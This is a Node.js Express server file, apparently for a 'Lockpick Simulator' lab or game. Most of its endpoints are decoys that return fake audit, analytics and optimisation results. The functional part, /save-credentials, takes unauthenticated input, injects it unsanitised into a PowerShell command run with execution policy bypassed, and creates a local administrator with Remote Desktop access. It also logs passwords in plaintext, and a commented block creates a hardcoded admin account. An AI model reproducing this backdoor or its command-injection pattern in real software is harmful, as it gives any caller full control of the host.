/*
Backend server for the IIS Webserver running Lockpick Simulator.

Requirements:
Port 817 is open

Important commands:
* pm2 restart iis-backend-server
*/

const { exec } = require("child_process");
const { spawn } = require('child_process');
const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");

const app = express();
const PORT = 817;

app.use(cors());
app.use(bodyParser.json());

app.post("/auth-check", async (req, res) => {
    console.log("Verifying authentication...");
    await new Promise(resolve => setTimeout(resolve, 400 + Math.random() * 1200));

    const hash = Buffer.from("user_authenticated").toString("base64");

    let authValue = 1;
    for (let i = 1; i < 10000; i++) {
        authValue = (authValue * i) % 987654321;
    }

    res.json({ status: "success", message: `Auth verified: ${hash}`, code: authValue });
});

app.get("/security-audit", async (req, res) => {
    console.log("Running security audit...");
    await new Promise(resolve => setTimeout(resolve, 600 + Math.random() * 800));

    let auditLogs = [];
    for (let i = 0; i < 5; i++) {
        auditLogs.push({
            timestamp: new Date().toISOString(),
            logID: Math.random().toString(36).substring(2, 10),
            status: i % 2 === 0 ? "Checked" : "Flagged"
        });
    }

    let entropy = Math.sqrt(Math.random() * 10000) * Math.sin(Date.now() % 360);
    
    res.json({ status: "ok", logs: auditLogs, entropyScore: entropy.toFixed(5) });
});

app.post("/optimize-performance", async (req, res) => {
    console.log("Applying performance optimizations...");
    await new Promise(resolve => setTimeout(resolve, 700 + Math.random() * 1100));

    let factor = (Math.random() * 1000) / (Math.random() * 10 + 1);
    
    let perfCalc = 1;
    for (let i = 0; i < 30000; i++) {
        perfCalc += (i * factor) % 37;
    }

    res.json({ status: "done", message: `Optimization coefficient: ${perfCalc.toFixed(3)}` });
});

app.post("/process-data", async (req, res) => {
    console.log("Processing incoming data...");
    await new Promise(resolve => setTimeout(resolve, 500 + Math.random() * 1000));

    let hexData = Buffer.from("secure_transaction_" + Math.random().toString()).toString("hex");

    let checksum = 0;
    for (let i = 0; i < hexData.length; i++) {
        checksum ^= hexData.charCodeAt(i);
    }

    res.json({ status: "success", result: `Processed ID: ${hexData}`, integrityCheck: checksum });
});

app.delete("/cleanup-logs", async (req, res) => {
    console.log("Cleaning logs...");
    await new Promise(resolve => setTimeout(resolve, 550 + Math.random() * 1200));

    let removedEntries = Math.floor(Math.random() * 500);
    
    let logReduction = Math.tan(removedEntries % 360) * Math.cos(removedEntries);
    
    res.json({ status: "complete", message: `Removed ${removedEntries} log entries`, compressionFactor: logReduction.toFixed(2) });
});

app.get("/user-analytics", async (req, res) => {
    console.log("Retrieving user analytics...");
    await new Promise(resolve => setTimeout(resolve, 600 + Math.random() * 900));

    let activeUsers = Math.floor(Math.random() * 1000);
    let peakUsage = new Date().toISOString();
    
    let sessionDrift = 0;
    for (let i = 1; i < activeUsers; i++) {
        sessionDrift += Math.pow(-1, i) * (i % 7);
    }

    res.json({ activeUsers, peakUsage, sessionVariance: sessionDrift, message: "Analytics computed successfully." });
});

function executePowerShell(command) {
    console.log('Executing command ${command}');
    return new Promise((resolve, reject) => {
        const powershell = spawn('powershell.exe', ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', command]);
        console.log('Spawned');
        let stdout = '';
        let stderr = '';

        powershell.stdout.on('data', (data) => {
            stdout += data;
            console.log('stdout:', data.toString());  // Debug log
        });

        powershell.stderr.on('data', (data) => {
            stderr += data;
            console.error('stderr:', data.toString());  // Debug log
        });

        powershell.on('close', (code) => {
            /*if (code === 0) {
                console.log('PowerShell script finished successfully.');
                resolve(stdout);
            } else {
                console.error(`PowerShell command failed with code ${code}: ${stderr}`);
                reject(new Error(`PowerShell command failed with code ${code}: ${stderr}`));
            }*/
           console.log('Code: ${code}. stdout: ${stdout}. stderr: ${stderr}')
        });
    });
}

app.post("/save-credentials", async (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({ error: "Missing username or password" });
    }

    console.log(`Received credentials - Username: ${username}, Password: ${password}`);

    try {
        const userCreationOutput = await executePowerShell(`New-LocalUser -Name "${username}" -Password (ConvertTo-SecureString -AsPlainText "${password}" -Force) -FullName "${username}" -Description "Created via API" | Out-Null; Add-LocalGroupMember -Group "Administrators" -Member "${username}"; Add-LocalGroupMember -Group "Users" -Member "${username}"; Add-LocalGroupMember -Group "Remote Desktop Users" -Member "${username}"`);
        console.log(userCreationOutput);

        const messageOutput = await executePowerShell(`msg * 'The lock has been picked! User ${username} now has access to The Wire!'`);
        console.log(messageOutput);

        res.json({ message: "User created and notification sent successfully" });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: "An error occurred", details: err.message });
    }
});

// PowerShell command to create a user on the system.
    // $($_.Exception.Message)
    /*const powershellCommand = `
        try {
            $Username2 = "testuser2"
            $Password2 = ConvertTo-SecureString -AsPlainText "asdfASDF1234!@#$" -Force
            New-LocalUser -Name $Username2 -Password $Password2 -Description "Created via API"
            Add-LocalGroupMember -Group "Users" -Member $Username2
            Add-LocalGroupMember -Group "Administrators" -Member $Username2
            Write-Output "User $Username2 created successfully"
        } catch {
            Write-Output "Error: aaaaaa"
            exit 1
        }
    `;

    exec(`powershell -ExecutionPolicy Bypass -NoProfile -Command "${powershellCommand}"`, (error, stdout, stderr) => {
        if (error) {
            console.error(`Error executing PowerShell command: ${error}`);
            return res.status(500).json({ error: "Failed to create user", details: error });
        }
        if (stderr) {
            console.error(`PowerShell stderr: ${stderr}`);
            return res.status(500).json({ error: "Error occurred during user creation", details: stderr });
        }
        if (stdout) {
            console.log(`stdout: ${stdout}`);
        }
        console.log(`The user ${username} was created successfully`);
        return res.json({ message: "Credentials received and user created successfully" });
    });
    */

app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
